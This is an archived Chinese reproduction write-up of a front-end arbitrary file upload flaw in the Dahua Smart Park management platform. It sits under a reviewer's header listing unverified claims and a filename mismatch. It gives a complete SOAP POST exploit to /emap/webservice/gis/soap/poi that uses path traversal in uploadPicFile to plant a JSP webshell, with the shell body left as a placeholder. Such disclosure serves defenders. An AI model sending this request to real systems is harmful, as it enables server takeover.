---
source: "MrWQ/vulnerability-paper"
id: "vw-b7b2549af0eccce68cc96607"
entity_id: "ve-b7b2549af0eccce68cc96607"
schema_version: "1"
title: "大华智慧园区前台任意文件上传（最新 1day）"
product: "大华智慧园区综合管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "示例带两条会话Cookie，具体版本未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E5%89%8D%E5%8F%B0/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%9C%80%E6%96%B0%201day%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://mp.weixin.qq.com/s/yJfjckA_XXcvfa92_Oef1w"
source_status: "recorded"
---

# 大华智慧园区前台任意文件上传（最新 1day）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华智慧园区综合管理平台
- 本文讨论：emap/webservice/gis/soap/poi uploadPicFile路径写入
- 版本、权限与配置前提：示例带两条会话Cookie，具体版本未给
- 资料类型：SOAP上传复现转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 接口存在/响应特征不能直接认定漏洞
- payload写kaisec.jsp而访问写kaisa.jsp，路径不一致
- arg1仅占位webshell未说明编码；Cookie的必要性未说明
- 最新1day无日期基准，推广页尾冗余
- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“访问 / url/kaisa.jsp”改为“访问 / url/kaisec.jsp”；“当访问接口时出现如下响应体时，基本可认定该漏洞存在。”改为“出现所示响应仅支持接口可达，不能单独确认越界上传或脚本执行；还需上传响应、保存路径与受控回读证据。”；HTTP 报文围栏改为 http。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 响应、匿名写入与执行条件待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yJfjckA_XXcvfa92_Oef1w)

**0x01 阅读须知**

**凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞原理**

大华智慧园区综合管理平台是由大华技术股份有限公司（Dahua Technology）开发的一款综合管理解决方案。该平台旨在帮助园区管理者提高管理效率、提升安全水平、优化资源利用，并实现智能化的园区运营。大华智慧园区综合管理平台采用模块化设计和开放式架构，可根据不同园区的需求进行定制和扩展。同时，它还支持云端部署和移动端访问，方便管理者随时随地监控园区运营情况。大华智慧园区综合管理平台存在前台任意文件上传漏洞。**本文将复现该漏洞的利用方法。**

**![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzunul6ZUoiaGFs5b5SyVe1A4iaqhg7WxWeJkGKeoOMwVa6UAVC5hpeckXQ/640?wx_fmt=png)**

**0x03 漏洞利用**

影响版本：

大华智慧园区综合管理平台

**poc:**

**漏洞利用点为：**

**/emap/webservice/gis/soap/poi 接口，出现所示响应仅支持接口可达，不能单独确认越界上传或脚本执行；还需上传响应、保存路径与受控回读证据。**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzulLcHGs3sevxjcKLm4Vnhg43qsfD32kE5JZKmj3JvDGKfDZ0po2TfVw/640?wx_fmt=png)

**exp：**

```http
POST /emap/webservice/gis/soap/poi HTTP/1.1
Cookie: JSESSIONID=5C1C93DE5EC7F18FBD493CEFB322B71E; JSESSIONID=423EE6DD6937C1E0568CEF2FAB6E9B01
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xxxxx:xxxx
Content-Length: 3117
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <res:uploadPicFile>
         <arg0>/../../kaisec.jsp</arg0>
         <arg1>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx(webshell)</arg1>
      </res:uploadPicFile>
   </soapenv:Body>
</soapenv:Envelope>

```

**打入 exp** 

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzu5Zc09BNjesQvicuVF7EicLqFwS5WaOia6bXD8C8fiar9Qzwib0xKgXv0EVQ/640?wx_fmt=png)

**访问 / url/kaisa.jsp：**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzuFaYSbrHypdFDUGEspEVvIBUM49huwoxPjXtzYccibO5pvuLDBW7P9iaQ/640?wx_fmt=png)

  同理 将 poyload 换成 webshell 马 可获取服务器权限：

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzum6HZG0ePh5tXGETuIO6uroqibMPVg1ECnbHxOJ6otdibh2j2MdXIbU7g/640?wx_fmt=png)

关注公众号带你了解更多 0/1day 漏洞

零日 / 一日 漏洞探讨加 Seven_-0928   

本实验室接受正规站点的授权渗透测试服务。如你的公司业务有 Web 渗透测试，高级渗透测试，红蓝对抗，黑客溯源，Java 代码审计等需求可联系以下微信进行商务洽谈：Xud330327

同时欢迎各位师傅加入 HW 闲聊吹水群（2000 人群）

**![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBst6p4gicEgvWYhUG15ibU3fHibbalVucuLZ76mxOCrOhTyhSu8Sru0DlwBYruQhnkIG8ia4shVDPd4VBg/640?wx_fmt=jpeg)**

![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBssPEvyWSBIpUFH4FYbmxzwydudRibUP8icaLbZJQ5WmBNtmFzWU8x8avVw34FqSicxFsaQCSfveDUXibg/640?wx_fmt=jpegwxfrom=5wx_lazy=1wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
